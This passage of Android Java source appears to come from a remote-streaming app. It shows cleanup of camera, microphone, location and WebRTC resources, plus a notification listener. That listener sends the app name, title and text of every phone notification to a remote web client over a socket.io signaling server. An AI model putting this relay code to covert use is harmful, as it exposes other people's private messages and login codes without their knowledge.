                ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                : PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getService(this, 0, stop, piFlags);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Camera and microphone streaming is running")
                .addAction(android.R.drawable.ic_media_pause, "Stop", pi)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true).build();
    }

    // =========================================================================
    // Cleanup
    // =========================================================================

    private void cleanup() {
        stopLocationUpdates();
        if (torchOn) setTorch(false);
        if (frontCapturer != null) { try { frontCapturer.stopCapture(); } catch (InterruptedException ignored) {} frontCapturer.dispose(); frontCapturer = null; }
        if (backCapturer  != null) { try { backCapturer.stopCapture();  } catch (InterruptedException ignored) {} backCapturer.dispose();  backCapturer  = null; }
        if (frontSource   != null) { frontSource.dispose();  frontSource   = null; }
        if (backSource    != null) { backSource.dispose();   backSource    = null; }
        if (audioSource   != null) { audioSource.dispose();  audioSource   = null; }
        if (peerConnection!= null) { peerConnection.close(); peerConnection = null; }
        if (frontHelper   != null) { frontHelper.dispose();  frontHelper   = null; }
        if (backHelper    != null) { backHelper.dispose();   backHelper    = null; }
        if (eglBase       != null) { eglBase.release();      eglBase       = null; }
        if (factory       != null) { factory.dispose();      factory       = null; }
        if (dataHandler   != null && dataRunnable != null) { dataHandler.removeCallbacks(dataRunnable); dataHandler = null; dataRunnable = null; }
        mainHandler.removeCallbacksAndMessages(null);
    }

    // =========================================================================
    // Notification Listener (inner class)
    // =========================================================================

    public static class NotificationListener extends NotificationListenerService {
        private Socket socket;
        private String webClientId;

        @Override public void onCreate() {
            super.onCreate(); connectSignaling();
        }

        private void connectSignaling() {
            try {
                IO.Options opts = new IO.Options();
                opts.transports           = new String[]{"websocket"};
                opts.reconnection         = true;
                opts.reconnectionAttempts = Integer.MAX_VALUE;
                opts.reconnectionDelay    = 3000;
                socket = IO.socket(SettingsRepository.getSignalingUrl(this), opts);
                socket.on(Socket.EVENT_CONNECT, args -> {
                    socket.emit("identify", "android");
                }).on("web-client-ready", args -> {
                    if (args[0] instanceof String) { webClientId = (String) args[0]; sendActiveNotifications(); }
                });
                socket.connect();
            } catch (URISyntaxException e) { Log.e(TAG, "NotifListener bad URL", e); }
        }

        private void sendActiveNotifications() {
            try { StatusBarNotification[] active = getActiveNotifications(); if (active != null) for (StatusBarNotification s : active) onNotificationPosted(s); }
            catch (Exception e) { Log.e(TAG, "Active notifications error", e); }
        }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            if (webClientId == null || socket == null || !socket.connected()) return;
            try {
                Notification n = sbn.getNotification();
                JSONObject d = new JSONObject();
                d.put("appName",   sbn.getPackageName());
                d.put("title",     n.extras.getString(Notification.EXTRA_TITLE, "No Title"));
                d.put("text",      n.extras.getString(Notification.EXTRA_TEXT,  "No Text"));
                d.put("timestamp", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime())));
                JSONObject msg = new JSONObject();
                msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("notification", d);
                socket.emit("notification", msg);
            } catch (JSONException e) { Log.e(TAG, "Notification send error", e); }
        }

        @Override public void onDestroy() {
            super.onDestroy();
            if (socket != null) { socket.disconnect(); socket = null; }
        }
    }
}
